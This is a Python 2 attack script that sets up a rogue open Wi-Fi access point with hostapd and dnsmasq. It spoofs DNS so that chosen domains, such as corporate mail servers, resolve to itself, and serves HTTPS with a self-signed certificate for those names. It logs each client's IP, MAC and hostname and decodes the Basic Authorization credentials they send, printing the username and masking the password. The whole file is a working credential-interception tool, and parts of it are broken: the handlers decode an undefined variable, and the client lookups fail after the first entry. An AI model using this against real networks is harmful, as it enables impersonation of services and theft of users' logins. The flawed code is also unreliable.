from argparse import ArgumentParser
from time import sleep
import subprocess
import signal
import os
import threading
import BaseHTTPServer
import datetime
from SimpleHTTPServer import SimpleHTTPRequestHandler
import sys
import base64
import ssl
import SocketServer

clients = []
macs = []
CERTFILE_PATH = "./cert.pem"

class AuthHandler(SimpleHTTPRequestHandler):

    def do_OPTIONS(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got OPTIONS request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        if self.headers.getheader('Authorization').split(' ')[1] is not None:
            creds_decode = base64.b64decode(creds)
            print "\t Username: " + creds_decode.split(":")[0]
            #print "\t Password: " + creds_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_POST(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got POST request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        if self.headers.getheader('Authorization').split(' ')[1] is not None:
            creds_decode = base64.b64decode(creds)
            print "\t Username: " + creds_decode.split(":")[0]
            #print "\t Password: " + creds_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_HEAD(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got HEAD request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        if self.headers.getheader('Authorization').split(' ')[1] is not None:
            creds_decode = base64.b64decode(creds)
            print "\t Username: " + creds_decode.split(":")[0]
            #print "\t Password: " + creds_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

    def do_GET(self):
        timestamp = datetime.datetime.now().strftime("%B %d %Y %I:%M %p")

        print "[+] Got GET request at " + timestamp
        print "\t IP: " + self.client_address[0]
        print "\t MAC: " + ip_to_mac(self.client_address[0])
        print "\t Hostname: " + ip_to_hostname(self.client_address[0])
        print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
        print "\t Host: " + str(self.headers.getheader('Host'))

        if self.headers.getheader('Authorization').split(' ')[1] is not None:
            creds_decode = base64.b64decode(creds)
            print "\t Username: " + creds_decode.split(":")[0]
            #print "\t Password: " + creds_decode.split(":")[1]
            print "\t Password: ***********"

        blacklist_mac(ip_to_mac(self.client_address[0]))

def serve_https(HandlerClass = AuthHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    httpd = SocketServer.TCPServer(("", 443), HandlerClass)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTFILE_PATH, server_side=True)

    sa = httpd.socket.getsockname()
    print "[+] Serving HTTPS on", sa[0], "port", sa[1]
    httpd.serve_forever()

def generate_hostapd_conf():
    with open("hostapd.conf", "w") as file:
        file.write("interface=" + str(args.interface) + "\n")
        file.write("channel=1\n")
        file.write("ssid=" + str(args.ssid) + "\n")
        file.write("wpa=0\n")
        file.write("auth_algs=1\n")
        file.write("macaddr_acl=1\n")
        file.write("accept_mac_file=" + str(os.getcwd()) + "/" + str(args.maclist) + "\n")

def generate_dnsmasq_hosts():
    with open("dnsmasq.hosts", "w") as file:
        for entry in str(args.domain).split(','):
            file.write("10.0.0.1  " + str(entry + "\n"))

def generate_dnsmasq_conf():
    with open("dnsmasq.conf", "w") as file:
        file.write("interface=" + str(args.interface) + "\n")
        file.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
        file.write("dhcp-option=3,10.0.0.1\n")
        file.write("dhcp-option=6,10.0.0.1\n")
        file.write("server=8.8.8.8\n")
        file.write("log-queries\n")
        file.write("log-dhcp\n")

def generate_ssl_conf():
    with open("ssl.conf", "w") as file:
        file.write("[req]\n")
        file.write("prompt = no\n")
        file.write("distinguished_name = req_distinguished_name\n")
        file.write("req_extensions = v3_req\n")
        file.write("[req_distinguished_name]\n")
        file.write("C = US\n")
        file.write("ST = California\n")
        file.write("L = Los Angeles\n")
        file.write("O = " + str(args.domain) + "\n")
        file.write("OU = " + str(args.domain) + "\n")
        file.write("CN = " + str(args.domain) + "\n")
        file.write("emailAddress = admin@" + str(args.domain) + "\n")
        file.write("[v3_req]\n")
        file.write("basicConstraints = CA:FALSE\n")
        file.write("keyUsage = nonRepudiation, digitalSignature, keyEncipherment\n")

def connected_clients():
    with open("dhcp.leases", "r") as file:
        for line in file.readlines():
            if (line.split()[1]) not in macs:
                macs.append(line.split()[1])
                clients.append({'MAC':line.split()[1],'IP':line.split()[2],'hostname':line.split()[3]})
                print "[+] Client connected " + str(line.split()[1]) + " " + str(line.split()[2]) + " " + str(line.split()[3])
                sleep(5)

def blacklist_mac(mac):
    with open("hostapd.allow", "r") as file:
        lines = file.readlines()
        file.close()

    with open("hostapd.allow", "w") as file:
        for line in lines:
            if line.replace('\n', '') == mac:
                print "[+] Removed MAC " + str(mac) + " from hostapd.allow file"
            else:
                file.write(line)
    # Send SIGHUP to force hostapd configuration refresh without restarting the daemon
    hostapd.send_signal(signal.SIGHUP)

def ip_to_mac(ip):
    for entry in clients:
        if ip == entry["IP"]:
            return entry["MAC"]
        else:
            print "[!] Could not find MAC address for IP:" + ip
            return "null"

def ip_to_hostname(ip):
    for entry in clients:
        if ip == entry["IP"]:
            return entry["hostname"]
        else:
            print "[!] Could not find hostname for IP:" + ip
            return "null"

parser = ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", required=True,
                    help="Wireless interface for access point (should not be managed by Network Manager)")

parser.add_argument("-s", "--ssid", dest="ssid", required=True,
                    help="SSID for access point (max one atm)")

parser.add_argument("-c", "--channel", dest="channel",
                    help="Wireless channel for access point")

parser.add_argument("-m", "--maclist", dest="maclist", required=True,
                    help="File containing allowed MAC addresses to connect (one per line)")

parser.add_argument("-d", "--domain", dest="domain", required=True,
                    help="Domain name to target (specify a comma separated list for mulitple names e.g 'outlook.office365.com,mail.company.com')")

args = parser.parse_args()

generate_hostapd_conf()
generate_dnsmasq_conf()
generate_dnsmasq_hosts()
generate_ssl_conf()

#os.system("ifconfig " + str(args.interface) + " down")

if os.path.isfile("./cert.pem"):
    print "[+] Using existing SSL certificate"
else:
    print "[!] No SSL certificate found, generating one..."
    cmd = ["/usr/bin/openssl", "req", "-new", "-x509", "-nodes", "-days", "365", "-config", str(os.getcwd()) + "/ssl.conf", "-keyout", "cert.pem", "-out", "cert.pem"]
    try:
        openssl = subprocess.Popen(cmd)
        openssl.wait()
    except subprocess.CalledProcessError as e:
        print "[!] Error returned while starting openssl. Exiting"
        print e.output
        exit()

with open("dnsmasq.log", 'w') as outfile:
    try:
        print "[+] Starting dnsmasq..."
        cmd = ["/usr/sbin/dnsmasq", "--addn-hosts=" + str(os.getcwd()) + "/dnsmasq.hosts", "--dhcp-leasefile=" + str(os.getcwd()) + "/dhcp.leases", "-d", "-C", str(os.getcwd()) + "/dnsmasq.conf"]
        dnsmasq = subprocess.Popen(cmd, stdout=outfile, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        print "[!] Error returned while starting dnsmasq. Check log file 'dnsmasq.log' for details. Exiting"
        print e.output
        exit()

with open("hostapd.log", 'w') as outfile:

    ''' This is tricky to error catch
    hostapd runs as a daemon but occasionally fails to start
    the wireless interface. When this happens the hostapd
    process continues to run but the access point will fail.

    exit status is never set as the process is still running.
    '''
    print "[+] Starting hostapd..."
    cmd = ["/usr/sbin/hostapd", str(os.getcwd()) + "/hostapd.conf"]
    hostapd = subprocess.Popen(cmd, stdout=outfile, stderr=subprocess.STDOUT)

web_server_thread = threading.Thread(target=serve_https)
web_server_thread.daemon = True
web_server_thread.start()

while True:
    try:
        connected_clients()
    except KeyboardInterrupt:
        print("[+] Interrupt received, stopping...")
        #clean up
        dnsmasq.kill()
        hostapd.kill()
        exit()
